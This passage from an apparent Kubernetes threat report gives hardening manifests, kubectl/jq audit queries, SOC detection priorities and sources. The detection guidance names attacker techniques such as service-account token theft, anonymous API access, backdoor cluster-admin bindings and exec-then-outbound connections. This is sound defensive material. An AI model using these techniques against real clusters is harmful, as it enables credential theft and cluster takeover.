# Namespace-default ServiceAccount: disable auto-mount
# This single configuration breaks the primary SA token theft vector
apiVersion: v1
kind: ServiceAccount
metadata:
  name: default
  namespace: production
automountServiceAccountToken: false  # Must be set on EVERY namespace's default SA
---
# When a pod genuinely needs API access, use a dedicated SA
# with projected tokens (bound + short-lived) instead of long-lived secrets
apiVersion: v1
kind: Pod
metadata:
  name: needs-api-access
spec:
  serviceAccountName: minimal-api-sa
  automountServiceAccountToken: false   # Override SA default
  volumes:
  - name: api-token
    projected:
      sources:
      - serviceAccountToken:
          path: token
          expirationSeconds: 3600     # 1-hour token — not the default 1-year
          audience: "https://kubernetes.default.svc"
  containers:
  - name: app
    image: registry.company.internal/app:sha256@...
    volumeMounts:
    - name: api-token
      mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      readOnly: true
---
# RBAC: Minimal permissions for the SA — no wildcards, no cluster scope
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: minimal-api-role
  namespace: production
rules:
- apiGroups: [""]
  resources: ["configmaps"]
  resourceNames: ["app-config"]   # Named resource access only — not all configmaps
  verbs: ["get"]                   # Read-only, specific resource
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: minimal-api-binding
  namespace: production
subjects:
- kind: ServiceAccount
  name: minimal-api-sa
  namespace: production
roleRef:
  kind: Role
  name: minimal-api-role
  apiGroup: rbac.authorization.k8s.io
```

**Audit query to find over-permissioned SAs (kubectl):**

```bash
# Find all ClusterRoleBindings granting cluster-admin to non-system accounts
kubectl get clusterrolebindings -o json | jq -r '
  .items[] |
  select(.roleRef.name == "cluster-admin") |
  select(.subjects[]?.kind == "ServiceAccount") |
  select(.subjects[]?.namespace != "kube-system") |
  "RISKY: \(.metadata.name) grants cluster-admin to \(.subjects[].name)@\(.subjects[].namespace)"
'

# Find all pods with auto-mounted SA tokens + their actual API permissions
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.automountServiceAccountToken != false) |
  select(.spec.serviceAccountName != null) |
  "\(.metadata.namespace)/\(.metadata.name): SA=\(.spec.serviceAccountName) (token auto-mounted)"
'
```

---

## Takeaways for the SOC

The following are concrete, prioritized actions derived directly from the attack patterns documented in this report. These are not general hardening guidelines; each item maps to a specific actor or technique analyzed above.

**1. Enable and centralize K8s audit logs immediately.**
The audit log is the only record of RBAC manipulation, pod exec sessions, and service account token requests. If your audit policy does not log `serviceaccounts/token` create requests at `RequestResponse` level, you are blind to SA token theft (22% of cloud environments, per Microsoft 2025 data). Pipeline audit logs to your SIEM within 24 hours of ingestion; do not rely on kubectl after the fact.

**2. Alert on `system:anonymous` in audit logs — zero tolerance.**
Any audit event where `user.username == "system:anonymous"` is either misconfiguration or active exploitation. This is TeamTNT RBAC Buster's entry point. A standing alert with no suppression window is appropriate; the false positive rate on a correctly configured cluster is zero.

**3. Treat `ClusterRoleBinding` creation to `cluster-admin` as a P1 incident.**
The RBAC Buster specifically creates persistent backdoor bindings that survive misconfiguration remediation. Automate a response playbook: when this event fires, immediately audit the binding subjects, suspend associated credentials, and audit all pods created in the subsequent 10-minute window.

**4. Correlate pod exec (audit) with outbound network connections (eBPF) within a 60-second window.**
Neither signal alone is sufficient for high-confidence detection. The behavioral fingerprint of SCARLETEEL, Kinsing, and most cryptomining campaigns is: exec → immediate outbound connection to non-RFC1918 address. Build this correlation as Rule 3 above. It will not fire on legitimate CI/CD if your pods do not exec-then-phone-home.

**5. Deploy Tetragon (or Falco in eBPF mode) as a DaemonSet on every non-Fargate node.**
Kinsing deploys a userland rootkit that hides from `ps` and `ls`. Agent-based tools relying on userspace process enumeration are subverted. eBPF-based telemetry operates below the rootkit's visibility horizon. On Fargate, accept that data-plane visibility is limited and compensate with strict egress Network Policies and GuardDuty.

**6. Apply `automountServiceAccountToken: false` to the `default` ServiceAccount in every namespace.**
This is a one-line configuration change that eliminates the primary credential-theft vector used in SCARLETEEL (Phase 3), Kinsing lateral movement, and Slow Pisces K8s pivoting. The attacker needs explicit, conscious effort to obtain a token instead of finding one pre-loaded.

**7. Implement admission control (Kyverno or OPA Gatekeeper) in `Enforce` mode before any workload reaches production.**
Running in `Audit` mode while planning to switch to `Enforce` is not a security control — it is observability. The policies in Pillar 4 directly deny the DaemonSet deployment pattern used by TeamTNT and the privileged container pattern used by SCARLETEEL. `Enforce` mode means these techniques cannot succeed; `Audit` mode means they can succeed and you get a log.

**8. Treat inactive workload identities as live attack surface.**
Microsoft observed 51% of workload identities as completely inactive in 2025. Inactive identities are preferred by Slow Pisces-style APTs precisely because they trigger no behavioral anomaly alerts — there is no baseline to deviate from. Enumerate all ServiceAccounts with no pod binding and no recent API activity; revoke or scope-limit them.

**9. For SCARLETEEL-style multi-cloud pivot prevention: restrict Terraform state S3 buckets.**
Apply S3 bucket policies denying access from any IAM role that is not the CI/CD pipeline role. Enable S3 access logging. Alert on `GetObject` calls to Terraform state files from unexpected IAM principals or from IAM roles attached to EC2 instances running Kubernetes workloads. This is the specific architectural control that breaks SCARLETEEL's cross-account pivot path.

**10. Test your detection logic quarterly against the techniques in this report.**
Deploy a known-malicious manifest (in a dedicated security-test namespace with Network Policies blocking all egress) that creates a privileged pod with `hostPID: true`. Verify that your admission controller blocks it, your audit log captures the attempt, and your SIEM alert fires within SLA. Detection rules that are not tested rot — and the adversaries in this report are actively testing your defenses.

---

## Sources

- [SCARLETEEL: Operation leveraging Terraform, Kubernetes, and AWS for data theft | Sysdig](https://www.sysdig.com/blog/cloud-breach-terraform-data-theft)
- [SCARLETEEL Fine-Tunes AWS and Kubernetes Attack Tactics - The New Stack](https://thenewstack.io/scarleteel-fine-tunes-aws-and-kubernetes-attack-tactics/)
- [First-Ever Attack Leveraging Kubernetes RBAC to Backdoor Clusters | Aqua Security](https://www.aquasec.com/blog/leveraging-kubernetes-rbac-to-backdoor-clusters/)
- [Aqua Nautilus Researchers Find Kubernetes Clusters Under Attack in Hundreds of Organizations](https://www.aquasec.com/news/kubernetes-clusters-under-attack/)
- [Understanding Current Threats to Kubernetes Environments | Palo Alto Unit 42](https://unit42.paloaltonetworks.com/modern-kubernetes-threats/)
- [Understanding the threat landscape for Kubernetes and containerized assets | Microsoft Security Blog](https://www.microsoft.com/en-us/security/blog/2025/04/23/understanding-the-threat-landscape-for-kubernetes-and-containerized-assets/)
- [Kinsing malware targets Kubernetes environments via misconfigured PostgreSQL | Security Affairs](https://securityaffairs.com/140581/hacking/kinsing-malware-kubernetes-environments.html)
- [New runc vulnerabilities allow container escape: CVE-2025-31133, CVE-2025-52565, CVE-2025-52881 | Sysdig](https://www.sysdig.com/blog/runc-container-escape-vulnerabilities)
- [runc container breakout vulnerabilities: A technical overview | CNCF](https://www.cncf.io/blog/2025/11/28/runc-container-breakout-vulnerabilities-a-technical-overview/)
- [Sigma Rule: Privileged Container Deployed | SigmaHQ](https://github.com/SigmaHQ/sigma/blob/master/rules/application/kubernetes/audit/kubernetes_audit_privileged_pod_creation.yml)
- [Falco - Cloud Native Runtime Security](https://falco.org/)
- [Tetragon - eBPF-based Security Observability and Runtime Enforcement](https://tetragon.io/)
- [Kubernetes Flaws Let Hackers Jump From Containers to Cloud Accounts | GBHackers](https://gbhackers.com/kubernetes-flaws/)
- [Dual Privilege Escalation Chain in GKE via FluentBit/Anthos | Unit 42](https://unit42.paloaltonetworks.com/google-kubernetes-engine-privilege-escalation-fluentbit-anthos/)
- [EKS Auto Mode Considerations | Rafay](https://docs.rafay.co/blog/2024/12/12/eks-auto-mode---considerations/)
- [Kubernetes Policy Comparison: Kyverno vs. OPA/Gatekeeper | Nirmata](https://nirmata.com/2025/02/07/kubernetes-policy-comparison-kyverno-vs-opa-gatekeeper/)
